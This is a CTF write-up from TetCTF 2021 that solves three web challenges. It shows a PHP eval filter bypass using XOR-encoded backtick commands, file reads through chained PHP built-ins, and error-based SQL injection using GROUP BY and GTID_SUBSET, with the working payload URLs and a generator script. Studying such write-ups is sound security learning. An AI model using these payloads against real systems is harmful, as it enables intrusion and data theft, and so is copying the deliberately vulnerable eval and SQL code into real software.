---
title: "CTF - TetCTF 2021"
categories: [ctf]
date: 2021-01-03
comments: true
image: /images/writeups/TetCTF2021/tet_logo.png
description: CTF - TetCTF 2021
---

# TetCTF 2021

<p align="center">
  <img src="/images/writeups/TetCTF2021/tet_logo.png" width="300"/>
</p>

I participate in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) with my mate [RazviOverflow](https://ctftime.org/user/72894) and got some challenges!

<p align="center">
  <img src="/images/writeups/TetCTF2021/tet_score.png" width="500"/>
</p>


- [Super Calc](#super-calc)
- [HPNY](#hpny)
- [mysqlimit](#mysqlimit)

---

# Web

##  Super Calc
100

Let try on the next-generation, the superior Calculator that support many operations, made with love <3

http://139.180.155.171/?calc=(1.2-0.2)*5.1


From the previous example I tried to remove the calc parameter and the PHP code showed up:

{% highlight php %}
<!-- Enjoy Tsu's Super Calculator <3, Not Only + - * / but also many other operators <3 <3 <3 -->

<?php

ini_set("display_errors", 0);

if(!isset($_GET["calc"])) 
{
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
    if($wl === 0 || strlen($_GET["calc"]) > 70) {
        die("Tired of calculating? Lets <a href='https://www.youtube.com/watch?v=wDe_aCyf4aE' target=_blank >relax</a> <3");
    }
    echo 'Result: ';
    eval("echo ".eval("return ".$_GET["calc"].";").";");
}
{% endhighlight %}

We have a regex which reject all the strings with letters and other symbols different than the ones on the expresion, so we are limited to use numbers and those symbols. Looking for something like that at Google I found [this writeup](https://www.programmersought.com/article/7881105401/) which uses non-alphanumeric strings and XOR operations to bypass the filter.

How is that? Our **calc** parameter is within the eval function, therefore it will be evaluated as a logical operation. XOR operations are known to be used on malware and shellcodes to ofuscate strings or other values. For example, **'9'^'\~'='G'** since the XOR operation with its ASCII values is **0x39^0x7E=0x47**. This way we can generate a string by concatenating different XOR operations.

We have to beware the other filter at the PHP file. This filter is regarding the length of the parameter. We cannot exceed 70 chars. So the possible optimizations are these. Imagine we want to place the string **GET** using XOR and the available characters:

```
G = ('9'^'~')
E = ('9'^'|')
T = ('('^'|')

GET = ('9'^'~').('9'^'|').('('^'|') - (length 29)

GET = ('99('^'~||') - (length 13)
```

Now into the most challenging part. How do we know the values we have to XOR to obtain a determinate output? We can obtain the posible values by combinating all the values and register the result into a dictionary. We can do it in python for example:

{% highlight python %}

from itertools import combinations_with_replacement
import json

val_chars = "0123456789+-*/()~^|&."
comb = combinations_with_replacement(val_chars, 2)

all_combs = {}
for i in list(comb):
	key = chr(ord(i[0]) ^ ord(i[1]))
	all_combs[key] = i
print(json.dumps(all_combs, indent=4))

{% endhighlight %}

A formatted output with a part of the generated dictionary is:

```
    "G": "('9', '~')",
    "g": "('9', '^')",
    "E": "('9', '|')",
    "U": "(')', '|')",
    "u": "('+', '^')",
    "W": "(')', '~')",
    "S": "('/', '|')",
    "s": "('-', '^')",
    "Q": "('/', '~')",
    "T": "('(', '|')",
    "t": "('*', '^')",
    "V": "('(', '~')",
    "q": "('/', '^')",
    "v": "('(', '^')",
```

What happens if we need to generate a character that is not on this list? Well we can merge the generated caracters and the accepted ones to generate new combinations. For example to generate character **\`** we can use this combination:

```
` = ('R'^'2')

'R' is not on the valid characters but can be generated from valid characters:

'R' = ('|'^'.')

Therefore:

` = (('|'^'.')^'2') = ('|'^'.'^'2')
```

Now that we have the method to inject text, let's define what text do we need to retrieve the flag.
The parameter "clac" is going to ve evaluated twice: First eval() will calculate all XORs and form the desired string. The second eval will "echo" the returned information from our payload. 
Supposing the flag is within the same web directory, we can execute commands to retrieve the flag. We can try to generate the payload "shell_exec(ls)" or "shell_exec('cat \*')" but they are too long when translated into XOR operations. 
In PHP we can use the [backticks](https://www.php.net/manual/en/language.operators.execution.php) to execute a command, which is a similar funcitonality than the shell_exec() function. We aimed to execute the command \`cat \*\` and retrieve the content of all the files within the web directory.

Using this concept I developed a small script to decompose every ASCII char into XOR operations using the valid charset:

{% highlight python %}

from itertools import combinations_with_replacement
import json

valid_chars = "0123456789+-*/()~^|&."
combs = combinations_with_replacement(valid_chars, 2)
target_string = '`cat *`'

simple_chars = {}
# Generate and store all possible combinations
for i in list(combs):
	key = chr(ord(i[0]) ^ ord(i[1]))
	simple_chars[key] = i
#print(json.dumps(simple_chars, indent=4))


# Merge all posible characters into a list and 
valid_generated_chars = ''.join(simple_chars.keys()) + valid_chars
complex_combinations = combinations_with_replacement(valid_generated_chars, 2)

complex_chars = {}
# Generate and store all possible complex combinations
for i in list(complex_combinations):
	key = chr(ord(i[0]) ^ ord(i[1]))
	complex_chars[key] = i
#print(json.dumps(complex_chars, indent=4))


for c in target_string:

	if c in simple_chars:
		print("{}: ('{}'^'{}')".format(c, simple_chars[c][0], simple_chars[c][1]))
	
	elif c in complex_chars:
		# If the character is complex, decompose it using only valid charset
		op1 = "'{}'".format(complex_chars[c][0])
		op2 = "'{}'".format(complex_chars[c][1])
		try:
			op1 = "'{0[0]}'^'{0[1]}'".format(simple_chars[complex_chars[c][0]])
		except:
			pass
		try:
			op2 = "'{0[0]}'^'{0[1]}'".format(simple_chars[complex_chars[c][1]])
		except:
			pass

		print("{}:: ({}^{})".format(c, op1, op2))

{% endhighlight %}


The output for the \`cat \*\` string is:

```
`:: ('|'^'.'^'2')
c:: ('|'^'.'^'1')
a:: ('|'^'.'^'3')
t: ('*'^'^')
 : ('~'^'^')
*:: ('^'^'.'^'|'^'&')
`:: ('|'^'.'^'2')

('|'^'.'^'2').('|'^'.'^'1').('|'^'.'^'3').('*'^'^').('~'^'^').('^'^'.'^'|'^'&').('|'^'.'^'2')
```

Concatenating that output leads into a 93 chars string, which will be refused by the length condition. We can merge adjacent XOR operations with the same number of operators and also use the \'\*\' as it is since is accepted by the regex. Knowing that, we end up with this expresion:

If there is an & on your XOR operations, encode it (%26), since the server will interpret it as a new parameter. Thanks to [RazviOverflow](https://ctftime.org/user/72894) who was aware of that and led us into the flag:

```
('|||'^'...'^'213').('*~'^'^^').('^'^'.'^'|'^'%26').('|'^'.'^'2')

('|||'^'...'^'213').('*~'^'^^').'*'.('|'^'.'^'2')

http://139.180.155.171/?calc=(%27|||%27^%27...%27^%27213%27).(%27*~%27^%27^^%27).%27*%27.(%27|%27^%27.%27^%272%27)

```

<p align="center">
  <img src="/images/writeups/TetCTF2021/1_flag.png" width="700"/>
</p>
	

``` TetCTF{_D0_Y0u_Know_H0w_T0_C4lculat3_1337?_viettel_*100*817632506233949#} ```



##  HPNY
100

Get some lucky word or number for your new year!

http://192.46.227.32/?roll=get_lucky_word


The website has the following code:

{% highlight php %}

<!-- Let's pray for new year lucky things <3 -->

<?php

function get_lucky_word() {
    $words = array("Chuc mung nam moi", "gongxifacai", "happy new year!", "bonne année", 
    "Akemashite omedeto gozaimasu", "Seh heh bok mahn ee bahd euh sae yo", "kimochi", "Feliz Año Nuevo", "S novim godom", 
    "Gelukkig Nieuwjaar", "selamat tahun baru", "iniya puthandu nal Vazhthukkal");
    return $words[array_rand($words)];
}

function get_lucky_number() {
    $numb = rand(0,100);
    return strval($numb);
}


if(!isset($_GET["roll"])) {
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[a-z\(\)\_\.]+$/i', $_GET["roll"]);

    if($wl === 0 || strlen($_GET["roll"]) > 50) {
        die("bumbadum badum");
    }
    eval("echo ".$_GET["roll"]."();");
}

?>

{% endhighlight %} 


The vulnerability is on the eval() function at the end, which can execute functions introduce at the command "roll". On this PHP we have 2 user defined functions, but PHP has what is called "inbuild" functions that can be called without being on the actual PHP file. We can display all available functions using the **get_defined_functions()**. This will return an array so in order to display all its content, we used **var_dump()** function or **print_r()**:


``` 

http://192.46.227.32/?roll=var_dump(get_defined_functions())

```

<p align="center">
  <img src="/images/writeups/TetCTF2021/2_functions.png" width="500"/>
</p>

Now, we can use some of the functions to retrieve information from the web directory:
var_dump(scandir(getcwd()))

scandir(\_\_DIR\_\_) == scandir(getcwd())

```
http://192.46.227.32/?roll=var_dump(scandir(getcwd()))
```

<p align="center">
  <img src="/images/writeups/TetCTF2021/2_scandir.png" width="500"/>
</p>

We can see the file which can contain the flag:

``` fl4g_here_but_can_you_get_it_hohoho.php ```

Since we cannot use the \[3\] to retrieve the 3rd position, we have to use [PHP array functions](https://www.php.net/manual/en/ref.array.php) to retrieve one of the positions from the array (the flag filename) and use it with the inbuild function **readfile()** to retrieve the file content. 

Since the file name is on the third position, we can use the function array_reverse() to place the filename at the second position and the use the next() function to advance the array pointer into the second place (the filename):

```
http://192.46.227.32/?roll=readfile(next(array_reverse(scandir(getcwd()))))
```

I tried the next(next()) option but the array is not be defined until we use the array_reverse() function, which returns an array from the scandir(getcwd()) command.


<p align="center">
  <img src="/images/writeups/TetCTF2021/2_flag.png" width="500"/>
</p>


``` TetCTF{lixi_50k_<3_vina_*100*25926415724382#} ```


##  mysqlimit
100

Limit 'Em All! http://45.77.255.164/


This challenge have the following PHP code with a database:

{% highlight php %}
<!-- The Author of this challenge is so kind and handsome that he is giving you flag, just need to bypass his god-tier waf and grab it <3 -->

<?php 

include('dbconnect.php');

if(!isset($_GET["id"]))
{
    show_source(__FILE__);
}
else
{
    // filter all what i found on internet.... dunno why ｡ﾟ･（>﹏<）･ﾟ｡
    if (preg_match('/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\<|\>|\=/is' , $_GET['id'])) 
    {
        die('<img src="https://i.imgur.com/C42ET4u.gif" />'); 
    }
    else
    {
        // prevent sql injection
        $id = mysqli_real_escape_string($conn, $_GET["id"]);

        $query = "select * from flag_here_hihi where id=".$id;
        $run_query = mysqli_query($conn,$query);

        if(!$run_query) {
            echo mysqli_error($conn);
        }
        else
        {    
            // I'm kidding, just the name of flag, not flag :(
            echo '<br>';
            $res = $run_query->fetch_array()[1];
            echo $res; 
        }
    }
}

?>
{% endhighlight %}


We can see that the SQL injection is possible but there are some keywords filtered by a regex, and also, we have the mysqli_real_escape_string() function which prevents the usage of quotes for the injection.

Using the following query in the "id" parameter we get all the rows from the _flag_here_hihi_, with this payload:

``` http://45.77.255.164/?id=1 || (select id from flag_here_hihi limit 1) ```

The response is: handsome_flag

Now we know the id, but that is useless since the fetch_array()[1] will only return the second column from the complete row where the flag resides. We try to retrieve the column names from the table using the output error and the GROUP BY keyword:

```
http://45.77.255.164/?id=1 group by 1

Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'flag_here_hoho.flag_here_hihi.t_fl4g_name_su' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by

http://45.77.255.164/?id=1 group by 2

Expression #3 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'flag_here_hoho.flag_here_hihi.t_fl4g_v3lue_su' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by

http://45.77.255.164/?id=1 group by 3

Expression #2 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'flag_here_hoho.flag_here_hihi.t_fl4g_name_su' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by

http://45.77.255.164/?id=1 group by 4

Unknown column '4' in 'group statement'
```

With those statements we can check some column name such as: 

- t_fl4g_name_su
- t_fl4g_v3lue_su

Aparently t_fl4g_v3lue_su is the column which could contain the flag. Trying other techniques to retrieve the flag did not work:

```
1 || (select id,t_fl4g_name_su from flag_here_hihi limit 1)

Operand should contain 1 column(s)

1 || (select t_fl4g_v3lue_su from flag_here_hihi limit 1)
```

After sometime and advice I could realize that GTID_SUBSET can help us to retrieve the information from the query and leak it through the error message. GTID_SUBSET receives two parameters with the identifier of the databases and the number or a range of transactions which are compared. When we transform the query result into HEX, the GTID_SUBSET function will try to look for a databaset with that identifier, but since it doesn't find anything, an error will be returned, avoiding the fetch_array()[1] and displaying the indicated column in hexadecimal.

``` http://45.77.255.164/?id=GTID_SUBSET(HEX((SELECT t_fl4g_v3lue_su FROM flag_here_hihi LIMIT 1)),1) ```

Response:

```
Malformed GTID set specification '5465744354467B5F57334C6C4C6C4C6C6C6C5F506C343479597959797959595F3C335F76696E615F2A3130302A3238393034393631343435353534237D'.
```

``` TetCTF{_W3LlLlLlll_Pl44yYyYyyYY_<3_vina_*100*28904961445554#} ```


Thanks for reading and also thanks to [DawidTheCactus](https://ctftime.org/user/76466) who teached me interesting things!